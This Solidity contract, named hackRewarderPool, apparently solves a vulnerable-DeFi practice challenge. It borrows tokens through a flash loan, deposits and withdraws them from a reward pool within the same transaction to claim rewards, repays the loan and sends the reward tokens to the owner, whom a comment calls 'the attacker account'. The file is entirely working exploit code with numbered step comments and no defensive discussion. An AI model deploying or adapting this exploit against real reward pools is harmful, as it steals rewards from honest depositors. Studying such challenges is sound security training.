pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import 'hardhat/console.sol';

interface IrewarderPool {
    function deposit(uint256) external;
    function withdraw(uint256) external;
}
interface IflashLoanPool {
    function flashLoan(uint256) external;
}
contract hackRewarderPool {
    IrewarderPool public rewardPool;
    IERC20 public rewardToken;
    IERC20 public dvtToken;
    address private owner;
    constructor(address rewardPoolAddress, address dvtTokenAddress, address rewardTokenAddress){
        rewardPool = IrewarderPool(rewardPoolAddress);
        dvtToken = IERC20(dvtTokenAddress);
        rewardToken = IERC20(rewardTokenAddress);
        owner = msg.sender;
    }   
    function receiveFlashLoan(uint256 _amountReceived) external {
        //Step 3 : On receiving flashLoan, deposit in TheRewardPool token
        console.log(_amountReceived);
        rewardPool.deposit(_amountReceived);
        rewardPool.withdraw(_amountReceived);
        //Step 4 : After withdraw we complete the flashLoan
        dvtToken.transfer(msg.sender, _amountReceived);
        //Step 5 : Transfer reward tokens to the attacker account.
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function hackit(address flashLoanAddress, uint256 amountToFlashLoan) public {
        //Step : 1 Approve DVT Tokens for the reward Pool 
        dvtToken.approve(address(rewardPool), amountToFlashLoan);
        //Step : 2 Get FlashLoan from the flashLoan pool.
        IflashLoanPool(flashLoanAddress).flashLoan(amountToFlashLoan);

    }
}